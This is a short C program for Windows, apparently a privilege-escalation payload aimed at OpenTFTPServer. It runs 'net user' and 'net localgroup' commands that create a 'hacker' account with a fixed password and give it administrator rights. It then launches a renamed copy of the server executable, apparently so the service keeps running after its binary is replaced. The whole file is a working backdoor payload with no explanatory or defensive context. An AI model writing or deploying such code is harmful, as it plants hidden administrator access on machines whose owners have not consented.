#include<windows.h>
int main(void){
 system("net user hacker mypassword /add");
 system("net localgroup Administrators hacker /add");
 WinExec("C:\\OpenTFTPServer\\~OpenTFTPServerSP.exe",0);
return 0;
} 
